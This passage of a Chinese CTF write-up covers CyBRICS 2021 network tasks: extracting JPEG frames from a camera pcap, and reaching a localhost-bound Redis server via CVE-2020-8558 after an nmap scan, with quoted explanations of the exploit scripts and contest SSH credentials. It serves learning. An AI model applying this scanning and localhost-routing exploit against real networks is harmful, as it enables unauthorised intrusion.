&lt;/code>&lt;/pre>&lt;p>（值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的&lt;code>%s/\s/./g&lt;/code>命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png" alt="image-20210729002105318">&lt;/p>
&lt;p>最后flag：cybrics{T3553R4C7_15_GOOD}&lt;/p>
&lt;p>————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到&lt;a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&amp;amp;t=2605s">录播视频&lt;/a>中看&lt;/p>
&lt;p>参考：&lt;a href="https://www.shuzhiduo.com/A/RnJW9QLBdq/">调皮捣蛋的Linux下有趣终端的合集&lt;/a> | &lt;a href="https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal">Linux Fun - 如何在终端中创建ASCII文本横幅&lt;/a> | &lt;a href="https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/">Neofetch - 显示具有分发标志的Linux系统信息&lt;/a>&lt;/p>
&lt;h2 id="lx-100-network-easy-192-pts">LX-100 (Network, Easy, 192 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.&lt;/p>
&lt;p>Anyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.&lt;/p>
&lt;p>&lt;a href="https://cybrics.net/files/lx100.pcap">&lt;strong>lx100.pcap&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>（说实话，pacp包是真的不会看TAT&lt;/p>
&lt;p>首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
（以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">官方视频中&lt;/a>确实这样可以成功 emmmm&lt;/p>
&lt;pre tabindex="0">&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
php -a
foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
&lt;/code>&lt;/pre>&lt;p>（以下是在&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">别的wp&lt;/a>中看到的py脚本： 可成功复现 导出455张jpg图&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>
&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FileCapture&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lx100.pcap&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;UDP&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;udp&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">srcport&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65415&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">udp_bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fromhex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ffd8ffdb&amp;#39;&lt;/span>&lt;span style="color:#111">):])&lt;/span>
&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;out_files/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_packet.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">udp_bytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg" alt="235_packet">&lt;/p>
&lt;p>&lt;del>放大 再放大 每一根&lt;/del> 最后的flag是 &lt;code>cybrics{Lost_Secrets_In_The_AIr}&lt;/code>&lt;/p>
&lt;h2 id="localhost-network-hard-267-pts">localhost (Network, Hard, 267 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh localhost@109.233.61.10
Password: ohx7eeQu
&lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
&lt;/blockquote>
&lt;p>先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png" alt="image-20210729122432345">&lt;/p>
&lt;p>自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段&lt;code>nmap -sS -Pn 10.193.10.7/24&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png" alt="image-20210729131318834">&lt;/p>
&lt;p>发现10.193.10.180的80端口开放，用curl访问&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
&lt;p>提示&lt;em>Flag-containing-Records&lt;/em> 接着访问两个超链接的内容&lt;/p>
&lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：&lt;/p>
&lt;pre tabindex="0">&lt;code>bind 127.0.0.1
protected-mod yes
port 6379
&lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>也是相关的配置文件 只有一句没被注释&lt;/p>
&lt;pre tabindex="0">&lt;code>net.ipv4.conf.all.route_localnet=1
&lt;/code>&lt;/pre>&lt;p>查google，发现了这些：&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
&lt;p>是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：&lt;/p>
&lt;blockquote>
&lt;p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> sysctl setting. According to the kernel documentation, this setting makes the kernel &amp;ldquo;not consider loopback addresses as martian&amp;rdquo; &amp;ndash; a consequence of which is that they could be accessed by other nodes on the network. That&amp;rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!&lt;/p>
&lt;p>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> changes that &amp;ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.&lt;/p>
&lt;p>So, if an attacker has a local connection to a target node with &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.&lt;/p>
&lt;p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&amp;rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.&lt;/p>
&lt;/blockquote>
&lt;p>（不得不说ipv4当初把整个&lt;code>127.0.0.0/8&lt;/code>的地址都给了本地回环用真的是太慷慨了&amp;hellip;&amp;hellip; 到ipv6就只有一个&lt;code>:: 1&lt;/code>&lt;/p>
&lt;p>在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>tst-2020-8558.py&lt;/strong>
Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to &lt;code>127.0.0.1&lt;/code> via your target, and looks to see if there is a reply.&lt;/p>
&lt;p>&lt;strong>poc-2020-8558.py&lt;/strong>
Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
Because this script uses raw sockets to send and receive the &amp;ldquo;localhost&amp;rdquo; packets, it works fine inside a normal unprivileged container.&lt;/p>
&lt;/blockquote>
&lt;p>因为需要nc 所以另开一个shell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png" alt="image-20210729153443403">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png" alt="image-20210729153501930">&lt;/p>
&lt;p>参考：&lt;a href="https://jan.show/?p=128">wp&lt;/a> | &lt;a href="https://www.zhihu.com/question/49866806">为什么整个127.*网段都被拿来当做环回地址了？&lt;/a>&lt;/p>
&lt;hr>
&lt;p>本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">此处是参考wp&lt;/a>&lt;/p>
&lt;p>道阻且长呀，暑假要好好努力咯 (つд⊂)
参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆&lt;/p></description></item></channel></rss>